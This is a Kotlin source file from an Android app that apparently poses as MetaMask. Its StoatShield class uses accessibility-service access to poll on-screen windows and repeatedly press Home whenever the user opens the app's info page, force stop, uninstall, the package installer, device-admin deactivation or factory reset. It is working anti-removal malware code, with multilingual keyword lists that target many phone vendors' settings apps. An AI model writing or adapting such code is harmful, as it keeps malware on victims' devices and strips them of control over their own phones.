package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.MetaMask.activities.CoralCobraActivity
import com.example.MetaMask.receivers.BadgerFalconRecv

class StoatShield {

    companion object {
        private const val SCAN_INTERVAL_MS = 100L
        private const val KICK_COOLDOWN_MS  = 350L

        private val SETTINGS_PKGS = setOf(
            "com.android.settings",
            "com.miui.securitycenter",
            "com.samsung.android.lool",
            "com.samsung.android.settings",
            "com.huawei.systemmanager",
            "com.oppo.safe",
            "com.coloros.safecenter",
            "com.oneplus.security",
            "com.asus.systemmanager",
            "com.vivo.permissionmanager",
            "com.transsion.phonemaster"
        )

        private val PACKAGE_INSTALLER_KICK_PKGS = setOf(
            "com.android.packageinstaller",
            "com.google.android.packageinstaller",
        )

        private fun isAppInfoHostPackage(pkg: String): Boolean =
            pkg in SETTINGS_PKGS ||
                pkg == "com.android.permissioncontroller" ||
                pkg == "com.google.android.permissioncontroller"

        private val APP_INFO_HEADER_IDS = listOf(
            "com.android.settings:id/app_detail_title",
            "com.android.settings:id/entity_header_title",
        )

        private val FORCE_STOP_IDS = listOf(
            "com.android.settings:id/force_stop_button",
            "com.android.settings:id/left_button",
            "com.android.settings:id/force_stop",
            "com.android.settings:id/btn_force_stop",
            "com.android.settings:id/action_button1"
        )

        private val FORCE_STOP_DETAIL_IDS = listOf(
            "com.android.settings:id/force_stop_button",
            "com.android.settings:id/force_stop",
            "com.android.settings:id/btn_force_stop",
            "com.android.settings:id/action_button1",
        )

        private val FORCE_STOP_TEXTS = setOf(
            "force stop", "force-stop",
            "принудительно остановить", "принудительная остановка",
            "forcer l'arrêt", "forzar parada",
            "강제 종료", "强制停止"
        )

        private val UNINSTALL_TERMS = setOf(
            "uninstall", "delete app", "remove app",
            "удалить", "удаление", "деинсталлировать",
            "deinstallieren", "désinstaller", "desinstalar", "disinstalla"
        )

        private val FACTORY_RESET_CLASS_MARKERS = listOf(
            "MasterClear", "FactoryReset", "ResetPhone", "ResetDevice",
            "EraseEverything", "WipeData", "ResetConfirm", "MasterClearConfirm",
            "ResetEsimFragment", "FactoryResetConfirm"
        )

        private val FACTORY_RESET_TERMS = setOf(
            "erase all data", "factory reset", "master clear", "reset phone",
            "reset device", "reset tablet", "wipe data", "erase phone",
            "erase all content", "reset to factory",
            "сброс настроек", "сбросить телефон", "стереть все данные",
            "заводские настройки", "полный сброс", "сбросить устройство",
            "стереть телефон", "сброс данных", "удалить все данные",
            "zurücksetzen", "réinitialiser", "restablecer", "ripristino"
        )

        private val INSTALLED_APP_DETAILS_CLASS_MARKERS = listOf(
            "InstalledAppDetails",
            "AppInfoDashboard",
            "AppStorageSettings",
            "AdvancedAppInfo",
            "ApplicationsDetailsActivity",
            "MiuiInstalledAppDetails",
            "AppDetailActivity",
            "AppInfoActivity",
        )

        private val SETTINGS_APP_LIST_CLASS_MARKERS = listOf(
            "ManageApplications",
            "AppPicker",
            "InstalledAppPicker",
            "AppUsageDashboard",
        )

        private val ACCESSIBILITY_SAFE_CLASS_MARKERS = listOf(
            "AccessibilitySettings",
            "AccessibilityServiceWarning",
            "ToggleAccessibilityServicePreferenceFragment",
            "AccessibilityDetailsSettingsActivity",
            "AccessibilityActivity",
        )

        private val SPECIAL_ACCESS_SAFE_CLASS_MARKERS = listOf(
            "SpecialAccessSettings",
            "SpecialAppAccess",
            "HighPowerApps",
            "BatteryOptimization",
            "HighPowerAppListFragment",
            "DrawOverlaySettings",
            "DrawOverlayDetails",
            "DisplayOverOtherApps",
            "ExternalSourcesDetails",
            "ManageExternalSources",
            "UsageAccessSettings",
            "UsageAccessDetails",
            "NotificationPolicyAccess",
            "ZenAccess",
            "NotificationAccessSettings",
            "NotificationAccessDetails",
            "WriteSettingsDetails",
            "MediaManagementApps",
            "AlarmsAndReminders",
            "BackgroundStartActivity",
            "VpnSettings",
            "PaymentSettings",
            "PictureInPicture",
            "ChangeWifiStateDetails",
            "ManageExternalStorage",
            "AppOpsSummary",
            "RequestAccessibilityButton",
        )

        private val APP_INFO_SCREEN_HINTS = listOf(
            "storage", "хранилищ", "permissions", "разрешен", "notifications", "уведомлен",
            "defaults", "по умолчанию", "mobile data", "мобильн",
            "battery", "батаре", "data usage", "трафик", "version", "верси",
            "set as default", "назначить", "app details", "сведения о приложении",
        )
    }

    @Volatile var enabled = true

    @Volatile var settingsBlockEnabled = true

    @Volatile var setupInProgress = false

    private var service: AccessibilityService? = null
    private var ourPkg   = ""
    private var ourLabel = ""

    @Volatile private var lastKickMs = 0L

    private val handler = Handler(Looper.getMainLooper())

    private val scanRunnable = object : Runnable {
        override fun run() {
            android.util.Log.d("XDBG", "[StoatShield] run enter") //xdbg
            if (!enabled) return
            try { checkAllWindows() } catch (_: Exception) {}
            handler.postDelayed(this, SCAN_INTERVAL_MS)
        }
    }

    fun start(svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[StoatShield] start enter svc=${svc}") //xdbg
        service = svc
        ourPkg   = svc.packageName
        ourLabel = try {
            val pm = svc.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(ourPkg, 0)).toString()
        } catch (_: Exception) { ourPkg }

        if (enabled) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            handler.postDelayed(scanRunnable, 400L)
        }
    }

    fun enable(on: Boolean) {
        android.util.Log.d("XDBG", "[StoatShield] enable enter on=${on}") //xdbg
        enabled = on
        if (on) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            handler.removeCallbacks(scanRunnable)
            handler.postDelayed(scanRunnable, 500L)
        } else {
            handler.removeCallbacks(scanRunnable)
        }
    }

    fun stop() {
        android.util.Log.d("XDBG", "[StoatShield] stop enter") //xdbg
        enabled = false
        handler.removeCallbacks(scanRunnable)
        service = null
    }

    fun onEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[StoatShield] onEvent enter event=${event}") //xdbg
        if (!enabled) return
        if (setupInProgress) return
        if (CoralCobraActivity.isOurGuidedSystemFlowActive()) return
        if (AccessSvc.instance?.isGrantChainActive() == true) return
        if (AccessSvc.instance?.autoIbis?.deviceAdminPending == true) return

        val pkg = event.packageName?.toString() ?: return
        val eventType = event.eventType

        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && pkg in SETTINGS_PKGS) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            val clickText = buildString {
                event.text?.forEach { append(it).append(' ') }
                event.contentDescription?.let { append(it) }
            }.trim().lowercase()
            if (FORCE_STOP_TEXTS.any { clickText.contains(it.lowercase()) }) {
                android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                kickRepeat()
                return
            }
        }

        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOWS_CHANGED) return

        when {
            pkg in PACKAGE_INSTALLER_KICK_PKGS -> {
                handler.post            { if (enabled) try { checkAllWindows() } catch (_: Exception) {} }
                handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 150L)
                handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 400L)
                handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 800L)
            }

            pkg in SETTINGS_PKGS -> {
                val className = event.className?.toString() ?: ""
                val classLower = className.lowercase()
                if (classLower.contains("game") || classLower.contains("booster") ||
                    classLower.contains("speed") || classLower.contains("floatingwindow")) {
                    return
                }
                if (FACTORY_RESET_CLASS_MARKERS.any { className.contains(it, ignoreCase = true) }) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    kickRepeat()
                    return
                }
                val evText = buildString {
                    event.text?.forEach { append(it).append(' ') }
                    event.contentDescription?.let { append(it) }
                }.trim().lowercase()
                if (FACTORY_RESET_TERMS.any { evText.contains(it) }) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    kickRepeat()
                    return
                }
                if (isAppInfoHostPackage(pkg)) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    handleAppInfoEvent(pkg, event)
                }
            }

            isAppInfoHostPackage(pkg) -> handleAppInfoEvent(pkg, event)
        }
    }

    private fun handleAppInfoEvent(pkg: String, event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[StoatShield] handleAppInfoEvent enter pkg=${pkg} event=${event}") //xdbg
        val className = event.className?.toString() ?: ""
        if (className.contains("DeviceAdminAdd", ignoreCase = true)) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            if (CoralCobraActivity.trackingDeviceAdminDialog) return
            if (AccessSvc.instance?.autoIbis?.deviceAdminPending == true) return
            kickRepeat()
            return
        }
        if (ACCESSIBILITY_SAFE_CLASS_MARKERS.any { className.contains(it, ignoreCase = true) }) return
        if (SPECIAL_ACCESS_SAFE_CLASS_MARKERS.any { className.contains(it, ignoreCase = true) }) return
        val isAppListContext =
            SETTINGS_APP_LIST_CLASS_MARKERS.any { className.contains(it, ignoreCase = true) }
        if (isAppListContext) return

        val isAppDetailsClass = INSTALLED_APP_DETAILS_CLASS_MARKERS.any { className.contains(it, ignoreCase = true) }
        val eventText = buildString {
            event.text?.forEach { append(it).append(' ') }
            event.contentDescription?.let { append(it) }
        }.trim()
        val mentionsUs = eventText.contains(ourLabel, ignoreCase = true) ||
            eventText.contains(ourPkg, ignoreCase = true)

        if (isAppDetailsClass && mentionsUs) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            kickRepeat()
            return
        }

        if (className.contains("SubSettings", ignoreCase = true) && mentionsUs) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            if (eventText.contains(ourPkg, ignoreCase = true) ||
                eventText.trim().equals(ourLabel, ignoreCase = true)) {
                kickRepeat()
                return
            }
        }

        val isShortTitle = eventText.length in 1..60
        if (isShortTitle && eventText.contains(ourPkg, ignoreCase = true)) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            kickRepeat()
            return
        }

        handler.post            { if (enabled) try { checkAllWindows() } catch (_: Exception) {} }
        handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 40L)
        handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 120L)
        handler.postDelayed({ if (enabled) try { checkAllWindows() } catch (_: Exception) {} }, 280L)
    }

    fun kickToHome() {
        android.util.Log.d("XDBG", "[StoatShield] kickToHome enter") //xdbg
        val now = System.currentTimeMillis()
        if (now - lastKickMs < KICK_COOLDOWN_MS) return
        lastKickMs = now
        val svc = service
        if (svc != null) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            handler.postDelayed({ svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }, 200L)
            handler.postDelayed({ svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }, 450L)
        }
    }

    private fun kickRepeat() {
        android.util.Log.d("XDBG", "[StoatShield] kickRepeat enter") //xdbg
        val svc = service
        if (svc != null) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            listOf(0L, 250L, 500L, 800L, 1100L).forEach { d ->
                handler.postDelayed({
                    if (enabled) svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                }, d)
            }
        }
        lastKickMs = System.currentTimeMillis()
    }

    private fun checkAllWindows() {
        android.util.Log.d("XDBG", "[StoatShield] checkAllWindows enter") //xdbg
        if (setupInProgress) return
        if (CoralCobraActivity.isOurGuidedSystemFlowActive()) return
        if (AccessSvc.instance?.isGrantChainActive() == true) return
        if (AccessSvc.instance?.autoIbis?.deviceAdminPending == true) return
        val svc = service ?: return
        val windows = try { svc.windows } catch (_: Exception) { null } ?: return

        for (win in windows) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                val title = try { win.title?.toString() } catch (_: Exception) { null }
                val winPkg: String? = try {
                    val r = win.root
                    val pkg = try { r?.packageName?.toString() } catch (_: Exception) { null }
                    try { r?.recycle() } catch (_: Exception) {}
                    pkg
                } catch (_: Exception) { null }

                if (winPkg == ourPkg) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    try { win.recycle() } catch (_: Exception) {}
                    continue
                }

                val isPurePkgInstaller = winPkg != null && (winPkg in PACKAGE_INSTALLER_KICK_PKGS ||
                    (winPkg.contains("packageinstaller") && !winPkg.contains("permissioncontroller")))
                if (isPurePkgInstaller && title != null && title.isNotBlank()) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    val hitsUs = (ourLabel.isNotBlank() && title.contains(ourLabel, ignoreCase = true)) ||
                                 (ourPkg.isNotBlank() && title.contains(ourPkg, ignoreCase = true))
                    if (hitsUs) {
                        android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                        try { win.recycle() } catch (_: Exception) {}
                        kickRepeat()
                        return
                    }
                }

                val isSettingsWin = winPkg != null && isAppInfoHostPackage(winPkg)
                if (isSettingsWin) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    val r = try { win.root } catch (_: Exception) { null }
                    val cls = try { r?.className?.toString() ?: "" } catch (_: Exception) { "" }
                    try { r?.recycle() } catch (_: Exception) {}
                    if (cls.contains("DeviceAdminAdd", ignoreCase = true)) {
                        android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                        try { win.recycle() } catch (_: Exception) {}
                        kickRepeat()
                        return
                    }
                }
                if (isSettingsWin && title != null && (
                        title.equals(ourLabel, ignoreCase = true) ||
                        title.equals(ourPkg, ignoreCase = true)
                    )) {
                    val r = try { win.root } catch (_: Exception) { null }
                    if (r != null) {
                        android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                        try {
                            val rootCls = r.className?.toString() ?: ""
                            if (ACCESSIBILITY_SAFE_CLASS_MARKERS.any { rootCls.contains(it, ignoreCase = true) } ||
                                SPECIAL_ACCESS_SAFE_CLASS_MARKERS.any { rootCls.contains(it, ignoreCase = true) }) {
                                try { win.recycle() } catch (_: Exception) {}
                                continue
                            }
                            val vb = getVisibleText(r).lowercase()
                            val lbl = containsVisibleText(r, ourLabel)
                            val sure = containsVisibleText(r, ourPkg) || hasVisibleAppDetailForceStop(r) ||
                                (lbl && countDetailSectionHits(vb) >= 3)
                            if (!sure) {
                                android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                                try { win.recycle() } catch (_: Exception) {}
                                continue
                            }
                        } finally {
                            try { r.recycle() } catch (_: Exception) {}
                        }
                    } else {
                        try { win.recycle() } catch (_: Exception) {}
                        continue
                    }
                    try { win.recycle() } catch (_: Exception) {}
                    kickRepeat()
                    return
                }
            }

            val root = try { win.root } catch (_: Exception) { null }
            if (root == null) {
                android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                try { win.recycle() } catch (_: Exception) {}
                continue
            }
            try {
                val rootPkg = root.packageName?.toString() ?: ""
                if (rootPkg in SETTINGS_PKGS && isFactoryResetVisible(root)) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    try { win.recycle() } catch (_: Exception) {}
                    kickRepeat()
                    return
                }
                if (win.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION && isOurAppInfoVisible(root)) {
                    android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                    try { win.recycle() } catch (_: Exception) {}
                    kickRepeat()
                    return
                }
            } finally {
                try { root.recycle() } catch (_: Exception) {}
            }
            try { win.recycle() } catch (_: Exception) {}
        }
    }

    private fun isFactoryResetVisible(root: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] isFactoryResetVisible enter root=${root}") //xdbg
        val visibleBlob = getVisibleText(root).lowercase()
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return FACTORY_RESET_TERMS.any { visibleBlob.contains(it) }
    }

    private fun hasVisibleAppDetailForceStop(root: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] hasVisibleAppDetailForceStop enter root=${root}") //xdbg
        for (id in FORCE_STOP_DETAIL_IDS) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                ?: continue
            for (n in nodes) {
                android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
                try {
                    if (isNodeVisibleEnough(n)) return true
                } finally {
                    try { n.recycle() } catch (_: Exception) {}
                }
            }
        }
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return FORCE_STOP_TEXTS.any { containsVisibleText(root, it) }
    }

    private fun isOurAppInfoVisible(root: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] isOurAppInfoVisible enter root=${root}") //xdbg
        val rootPkg = root.packageName?.toString() ?: ""
        val isPurePkgInstaller = rootPkg in PACKAGE_INSTALLER_KICK_PKGS ||
            (rootPkg.contains("packageinstaller") && !rootPkg.contains("permissioncontroller"))

        if (isPurePkgInstaller) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            if (ourPkg.isNotBlank() && containsVisibleText(root, ourPkg)) return true
            if (ourLabel.isNotBlank() && ourLabel != ourPkg &&
                containsVisibleText(root, ourLabel)) return true
            val allText = getAllText(root)
            if (ourPkg.isNotBlank() && allText.contains(ourPkg, ignoreCase = true)) return true
            if (ourLabel.isNotBlank() && ourLabel != ourPkg &&
                allText.contains(ourLabel, ignoreCase = true)) return true
            android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
            return false
        }

        if (!isAppInfoHostPackage(rootPkg)) return false

        val rootClass = root.className?.toString() ?: ""
        if (ACCESSIBILITY_SAFE_CLASS_MARKERS.any { rootClass.contains(it, ignoreCase = true) }) return false
        if (SPECIAL_ACCESS_SAFE_CLASS_MARKERS.any { rootClass.contains(it, ignoreCase = true) }) return false

        val blobFull = getAllText(root).lowercase()
        if (looksLikeDeviceAdminActivationScreen(blobFull)) return false

        val pkgVisible = containsVisibleText(root, ourPkg)
        val labelVisible = containsVisibleText(root, ourLabel)
        val visibleBlob = getVisibleText(root).lowercase()
        val sectionHits = countDetailSectionHits(visibleBlob)
        val detailContext = pkgVisible || hasVisibleAppDetailForceStop(root) ||
            (labelVisible && sectionHits >= 3)

        for (id in APP_INFO_HEADER_IDS) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
            nodes?.forEach { node ->
                try {
                    val text = node.text?.toString() ?: ""
                    if (!isNodeVisibleEnough(node)) return@forEach
                    if (text.equals(ourLabel, ignoreCase = true) ||
                        text.equals(ourPkg, ignoreCase = true)) {
                        if (detailContext) return true
                    }
                } finally {
                    try { node.recycle() } catch (_: Exception) {}
                }
            }
        }

        if (!pkgVisible && !labelVisible) return false

        if (pkgVisible && APP_INFO_SCREEN_HINTS.any { hint -> visibleBlob.contains(hint) }) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
            return true
        }

        for (id in FORCE_STOP_IDS) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            var anyVisible = false
            nodes.forEach { n ->
                try {
                    if (isNodeVisibleEnough(n)) anyVisible = true
                } finally {
                    try { n.recycle() } catch (_: Exception) {}
                }
            }
            if (!anyVisible) continue
            val isGenericLeft = id.endsWith("left_button")
            if (isGenericLeft) {
                android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
                if (FORCE_STOP_TEXTS.any { containsVisibleText(root, it) } &&
                    hasUsForCurrentDetail(pkgVisible, labelVisible, detailContext)) return true
            } else {
                if (hasUsForCurrentDetail(pkgVisible, labelVisible, detailContext)) return true
            }
        }

        if (detailContext) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            for (fsText in FORCE_STOP_TEXTS) {
                android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
                if (containsVisibleText(root, fsText) &&
                    hasUsForCurrentDetail(pkgVisible, labelVisible, detailContext)) return true
            }
            for (term in UNINSTALL_TERMS) {
                android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
                if (containsVisibleText(root, term) &&
                    hasUsForCurrentDetail(pkgVisible, labelVisible, detailContext)) return true
            }
        }

        val hasDevAdmin = visibleBlob.contains("device admin") || visibleBlob.contains("администратор")
        val isRemoveFlow = visibleBlob.contains("remove") || visibleBlob.contains("deactivate") ||
            visibleBlob.contains("удалить") || visibleBlob.contains("отключить") || visibleBlob.contains("деактивировать")
        if (hasDevAdmin && isRemoveFlow && (pkgVisible || labelVisible)) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
            return true
        }

        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return false
    }

    private fun hasUsForCurrentDetail(
        pkgVisible: Boolean,
        labelVisible: Boolean,
        detailContext: Boolean
    ): Boolean {
        if (pkgVisible) return true
        if (detailContext && labelVisible) return true
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return false
    }

    private fun countDetailSectionHits(blob: String): Int {
        android.util.Log.d("XDBG", "[StoatShield] countDetailSectionHits enter blob=${blob}") //xdbg
        val categories = listOf(
            listOf("permission", "разрешен", "app access"),
            listOf("storage", "хранилищ", "internal storage", "память"),
            listOf("notification", "уведомлен"),
            listOf("battery", "батаре", "battery usage", "электропотреб"),
            listOf("mobile data", "трафик", "cellular data", "сеть"),
            listOf("version", "версия"),
            listOf("open by default", "по умолчанию", "set as default"),
            listOf("cache", "кэш", "clear data", "данные"),
            listOf("force stop", "принудител", "остановить прилож"),
            listOf("install", "installed", "источник", "store"),
        )
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return categories.count { patterns -> patterns.any { blob.contains(it) } }
    }

    private fun looksLikeDeviceAdminActivationScreen(t: String): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] looksLikeDeviceAdminActivationScreen enter t=${t}") //xdbg
        if (t.contains("deactivate") || t.contains("деактив")) return false
        if (t.contains("activate this device admin app")) return true
        if (t.contains("this device admin app")) return true
        if (t.contains("device admin app") && t.contains("activate")) return true
        if (t.contains("администратор") && (t.contains("активировать") || t.contains("activate"))) return true
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return false
    }

    private fun isNodeVisibleEnough(n: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] isNodeVisibleEnough enter n=${n}") //xdbg
        if (!n.isVisibleToUser) return false
        val r = Rect()
        n.getBoundsInScreen(r)
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return r.width() > 2 && r.height() > 2
    }

    private fun containsVisibleText(node: AccessibilityNodeInfo, query: String): Boolean {
        android.util.Log.d("XDBG", "[StoatShield] containsVisibleText enter node=${node} query=${query}") //xdbg
        if (query.isBlank()) return false
        val found = try { node.findAccessibilityNodeInfosByText(query) } catch (_: Exception) { null }
            ?: return false
        var ok = false
        for (n in found) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            try {
                if (isNodeVisibleEnough(n)) ok = true
            } finally {
                try { n.recycle() } catch (_: Exception) {}
            }
            if (ok) return true
        }
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return false
    }

    private fun getAllText(node: AccessibilityNodeInfo): String {
        android.util.Log.d("XDBG", "[StoatShield] getAllText enter node=${node}") //xdbg
        val sb = StringBuilder()
        collectText(node, sb, 0)
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return sb.toString()
    }

    private fun getVisibleText(node: AccessibilityNodeInfo): String {
        android.util.Log.d("XDBG", "[StoatShield] getVisibleText enter node=${node}") //xdbg
        val sb = StringBuilder()
        collectVisibleText(node, sb, 0)
        android.util.Log.d("XDBG", "[StoatShield] return") //xdbg
        return sb.toString()
    }

    private fun collectText(node: AccessibilityNodeInfo, sb: StringBuilder, depth: Int) {
        android.util.Log.d("XDBG", "[StoatShield] collectText enter node=${node} sb=${sb} depth=${depth}") //xdbg
        if (depth > 8) return
        node.text?.let { if (it.isNotEmpty()) sb.append(it).append(' ') }
        node.contentDescription?.let { if (it.isNotEmpty()) sb.append(it).append(' ') }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            collectText(child, sb, depth + 1)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    private fun collectVisibleText(node: AccessibilityNodeInfo, sb: StringBuilder, depth: Int) {
        android.util.Log.d("XDBG", "[StoatShield] collectVisibleText enter node=${node} sb=${sb} depth=${depth}") //xdbg
        if (depth > 10) return
        if (isNodeVisibleEnough(node)) {
            android.util.Log.d("XDBG", "[StoatShield] if branch") //xdbg
            node.text?.let { if (it.isNotEmpty()) sb.append(it).append(' ') }
            node.contentDescription?.let { if (it.isNotEmpty()) sb.append(it).append(' ') }
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[StoatShield] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try {
                collectVisibleText(child, sb, depth + 1)
            } finally {
                try { child.recycle() } catch (_: Exception) {}
            }
        }
    }
}
